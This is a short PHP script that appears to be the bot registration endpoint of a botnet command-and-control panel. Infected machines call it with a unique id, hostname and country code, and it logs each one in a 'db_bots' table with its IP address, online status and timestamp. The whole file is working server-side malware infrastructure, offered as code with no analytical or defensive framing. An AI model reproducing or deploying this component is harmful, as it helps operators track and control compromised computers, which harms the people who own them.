<?php
	include('include/connection.php');

	// Check if everything is fine to insert the new bot in the database
	if (isset($_GET['uid']) && isset($_GET['hostname']) && isset($_GET['cc'])) {
		$sock = getDBSock();

		$uid = mysqli_real_escape_string($sock, htmlspecialchars($_GET['uid']));
		$ip = $_SERVER['REMOTE_ADDR'];
		$hostname = mysqli_real_escape_string($sock, htmlspecialchars($_GET['hostname']));
		$cc = mysqli_real_escape_string($sock, htmlspecialchars($_GET['cc']));
		$tstamp = time(); // Current time

		$sql = "INSERT INTO db_bots VALUES('$uid', '$ip', '$hostname', '$cc', '1', '$tstamp', '0') ";
		$sql.= "ON DUPLICATE KEY UPDATE uid='$uid', ip='$ip', hostname='$hostname', CC='$cc', status='1', t_on='$tstamp'";

		// Execute the query
		$result = mysqli_query($sock, $sql) or die('Error: '.mysqli_error($sock));
		if (!$result)
			die('Error: '.mysqli_error($sock));

		mysqli_close($sock);
	}
?>
